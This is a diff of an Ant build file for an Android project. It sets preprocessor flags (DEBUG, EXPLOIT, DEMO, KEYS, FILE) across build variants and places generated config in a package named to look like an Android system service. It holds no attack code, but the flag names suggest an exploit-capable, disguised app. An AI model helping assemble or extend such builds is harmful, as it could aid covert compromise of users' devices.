@@ -143,6 +143,7 @@
 				<filter token="DEBUG" value="true" />
 				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="true" />
+				<filter token="FILE" value="true" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -161,7 +162,7 @@
 		<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="DEBUG" value="false" />
-				<filter token="EXP" value="false" />
+				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="false" />
 				<filter token="KEYS" value="false" />
 				<filter token="FILE" value="false" />
@@ -185,6 +186,7 @@
 				<filter token="DEBUG" value="true" />
 				<filter token="EXPLOIT" value="false" />
 				<filter token="DEMO" value="true" />
+				<filter token="FILE" value="false" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
@@ -205,6 +207,7 @@
 				<filter token="DEBUG" value="true" />
 				<filter token="EXPLOIT" value="true" />
 				<filter token="DEMO" value="true" />
+				<filter token="FILE" value="false" />
 			</filterset>
 		</copy>
 		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
